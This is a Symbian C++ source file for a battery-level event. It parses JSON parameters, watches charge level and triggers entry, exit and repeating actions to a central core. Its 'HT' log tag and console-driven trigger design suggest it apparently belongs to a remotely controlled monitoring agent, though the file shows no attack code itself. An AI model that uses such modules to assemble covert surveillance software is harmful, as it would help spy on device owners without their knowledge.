/*
 * EventBattery.cpp
 *
 *  Created on: 27/set/2010
 *      Author: Giovanna
 */

#include "EventBattery.h"
#include "Json.h"

CEventBattery::CEventBattery(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Battery, aTriggerId),iBatteryInfoPckg(iBatteryInfo)
	{
	// No implementation required
	}

CEventBattery::~CEventBattery()
	{
	__FLOG(_L("Destructor"));
	delete iPhone;
	delete iTimerRepeat;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	} 

CEventBattery* CEventBattery::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventBattery* self = new (ELeave) CEventBattery(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventBattery* CEventBattery::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventBattery* self = CEventBattery::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}

void CEventBattery::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventBattery.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	
	RBuf paramsBuf;
		
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
		
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve levels
		if(rootObject->Find(_L("max")) != KErrNotFound)
			rootObject->GetIntL(_L("max"),iBatteryParams.iMaxLevel);
		if(rootObject->Find(_L("min")) != KErrNotFound)
			rootObject->GetIntL(_L("min"),iBatteryParams.iMinLevel);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			rootObject->GetIntL(_L("end"),iBatteryParams.iExitAction);
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			//action
			rootObject->GetIntL(_L("repeat"),iBatteryParams.iRepeatAction);
			//iter
			if(rootObject->Find(_L("iter")) != KErrNotFound)
				rootObject->GetIntL(_L("iter"),iBatteryParams.iIter);
			//delay
			if(rootObject->Find(_L("delay")) != KErrNotFound)
				{
				rootObject->GetIntL(_L("delay"),iBatteryParams.iDelay);
				if(iBatteryParams.iDelay == 0)
					iBatteryParams.iDelay = 1;
				}
			}
		
		//retrieve enable flag
		rootObject->GetBoolL(_L("enabled"),iEnabled);
				
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);

	// just to be sure (but Console also check it) we restore default values
	if(iBatteryParams.iMinLevel > iBatteryParams.iMaxLevel)
		{
		iBatteryParams.iMinLevel = 10;
		iBatteryParams.iMaxLevel = 90;
		}
	
	if((iBatteryParams.iRepeatAction != -1) && (iBatteryParams.iDelay != -1))
		{
		iTimerRepeat = CTimeOutTimer::NewL(*this);
		iSecondsIntervRepeat = iBatteryParams.iDelay;
		}
	else
		iTimerRepeat = NULL;
		
	iPhone = CPhone::NewL();
	iPhone->SetObserver(this);
	__FLOG(_L("End ConstructL"));
	}

void CEventBattery::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
	
	iEnabled = ETrue;
	
	// Initialize Properly the iWasInRange value, 
	iWasInRange = InRange();
	
	if(iWasInRange)
		{
		SendActionTriggerToCoreL();
		//start repeat action
		if((iBatteryParams.iRepeatAction != -1) && (iBatteryParams.iDelay != -1))
			{
			iSteps = iBatteryParams.iIter;
					
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->CustomAt(iTimeAtRepeat);
			}
		}
	
	// Receives change notifications of the battery status
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	
	}

void CEventBattery::StopEventL()
	{
	if(iTimerRepeat != NULL)
		iTimerRepeat->Cancel();
	iPhone->Cancel();
	iEnabled = EFalse;
	}

TBool CEventBattery::InRange()
	{
	__FLOG(_L("InRange()"));
	
	TUint chargeLevel=0;
	CTelephony::TBatteryStatus batteryStatus;
	iPhone->GetBatteryInfoSync(chargeLevel, batteryStatus);
	if ((chargeLevel >= iBatteryParams.iMinLevel) && (chargeLevel <= iBatteryParams.iMaxLevel))
		return ETrue;
	else
		return EFalse;
	}


void CEventBattery::HandlePhoneEventL(TPhoneFunctions event)
	{
	__FLOG(_L("HandlePhoneEventL()"));
	
	if (event != ENotifyBatteryStatusChange)
		return;

	if (InRange())
		{
		// inside range
		// Before trigger the event perform an additional check, just in case.
		if (!iWasInRange)
			{
			iWasInRange = ETrue;
			// Triggers the In-Action
			SendActionTriggerToCoreL();
			// Triggers the Repeat-Action
			if((iBatteryParams.iRepeatAction != -1) && (iBatteryParams.iDelay != -1))
				{
				iSteps = iBatteryParams.iIter;
									
				iTimeAtRepeat.HomeTime();
				iTimeAtRepeat += iSecondsIntervRepeat;
				iTimerRepeat->CustomAt(iTimeAtRepeat);
				}
			}
		}
	else
		{
		// not connected
		if (iWasInRange)
			{
			// Stop the repeat action
			if(iTimerRepeat != NULL)
				iTimerRepeat->Cancel();
			iWasInRange = EFalse;
			// Triggers the unplug action
			if (iBatteryParams.iExitAction != -1)
				{
				SendActionTriggerToCoreL(iBatteryParams.iExitAction);
				}
			}
		}
	iPhone->NotifyBatteryStatusChange(iBatteryInfoPckg);
	}

void CEventBattery::TimerExpiredL(TAny* /*src*/)
	{
	if(iBatteryParams.iIter == -1)
		{
		// infinite loop
		// restart timer
		iTimeAtRepeat.HomeTime();
		iTimeAtRepeat += iSecondsIntervRepeat;
		iTimerRepeat->CustomAt(iTimeAtRepeat);
		SendActionTriggerToCoreL(iBatteryParams.iRepeatAction);
		}
	else
		{
		// finite loop
		if(iSteps > 0)
			{
			// still something to do
			iTimeAtRepeat.HomeTime();
			iTimeAtRepeat += iSecondsIntervRepeat;
			iTimerRepeat->CustomAt(iTimeAtRepeat);
			--iSteps;
			SendActionTriggerToCoreL(iBatteryParams.iRepeatAction);
			}
		}
	}
